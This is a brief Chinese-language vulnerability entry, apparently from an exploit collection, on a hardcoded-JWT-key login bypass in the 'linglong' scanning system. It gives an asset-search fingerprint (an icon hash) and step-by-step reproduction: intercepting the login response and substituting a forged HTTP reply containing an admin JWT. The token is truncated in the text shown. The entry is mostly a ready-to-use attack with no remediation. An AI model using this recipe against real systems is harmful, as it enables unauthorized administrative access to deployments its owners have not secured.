# linglong扫描系统存在JWT密钥硬编码登录绕过漏洞

- **系统**：linglong　|　**类型**：认证/授权绕过　|　**CVE**：—
- **指纹**：`icon_hash="684115083"`

**请求体 / payload**
```
1、登陆时抓包\

2、拦截返回包\

3、替换返回包为如下内容：\
HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: Content-Type,AccessToken,X-CSRF-Token, Authorization,Token,X-TOKEN
Access-Control-Allow-Methods: POST, GET,PUT, DELETE, OPTIONS
Access-Control-Allow-Origin: *
Access-Control-Expose-Headers: Content-Length, Access-Control-Allow-Origin, Access-Control-Allow-Headers, Content-Type
Content-Type: application/json; charset=utf-8
Date: Fri, 17 May 2024 09:39:26 GMT
Content-Length: 43
{"code":200,"data":{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc…（脚本共 719 字，完整版见原文）
```

**其他**
- linglong扫描系统存在JWT密钥硬编码登录绕过漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * linglong扫描系统